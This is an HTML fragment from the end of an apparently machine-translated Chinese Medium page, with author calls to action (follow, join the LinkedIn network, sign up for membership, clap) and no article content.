rel="noopener"> <strong class="kw iu"> <em class="pf">跟我上媒</em> </strong> </a></li><li id="737a" class="my mz it kw b kx nh la ni ld nj lh nk ll nl lp nd ne nf ng bi translated"><strong class="kw iu"> <em class="pf">更多有趣的文章，请</em> </strong> <a class="ae nm" href="https://medium.com/trading-data-analysis" rel="noopener"> <strong class="kw iu"> <em class="pf">关注我的刊物</em> </strong> </a></li><li id="5d7b" class="my mz it kw b kx nh la ni ld nj lh nk ll nl lp nd ne nf ng bi translated"><strong class="kw iu"> <em class="pf">有兴趣合作吗？</em> </strong> <a class="ae nm" href="https://www.linkedin.com/in/miwhittle/" rel="noopener ugc nofollow" target="_blank"> <strong class="kw iu"> <em class="pf">我们上领英</em> </strong> </a>连线吧</li><li id="e1a5" class="my mz it kw b kx nh la ni ld nj lh nk ll nl lp nd ne nf ng bi translated"><strong class="kw iu"> <em class="pf">支持我和其他媒体作者</em> </strong> <a class="ae nm" href="https://whittle.medium.com/membership" rel="noopener"> <strong class="kw iu"> <em class="pf">在此报名</em> </strong> </a></li><li id="872e" class="my mz it kw b kx nh la ni ld nj lh nk ll nl lp nd ne nf ng bi translated"><strong class="kw iu"> <em class="pf">请别忘了为文章鼓掌:)←谢谢！</em>T45】</strong></li></ul></div></div>    
</body>
</html>